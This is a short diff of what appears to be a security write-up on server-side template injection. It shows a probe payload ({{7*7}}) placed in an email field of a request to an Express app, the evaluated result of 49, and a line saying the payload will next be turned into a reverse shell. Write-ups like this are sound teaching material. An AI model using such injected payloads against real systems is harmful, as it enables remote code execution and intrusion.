@@ -86,7 +86,7 @@ Priority: u=0
 Te: trailers
 Connection: keep-alive
 
-{"email":"{{7*7}}"}
+!!{"email":"{{7*7}}"}
 ```
 
 And the response we get shows it executed the code written to the template:
@@ -100,7 +100,7 @@ Connection: keep-alive
 X-Powered-By: Express
 ETag: W/"4b-X79sUiArPHkUd9eYQd+2RjLRKtA"
 
-{"response":"You will receive updates on the following email address: 49."}
+!!{"response":"You will receive updates on the following email address: 49."}
 ```
 
 We can now weaponize this to get a reverse shell on the system by altering the payload to fetch and execute a reverse shell
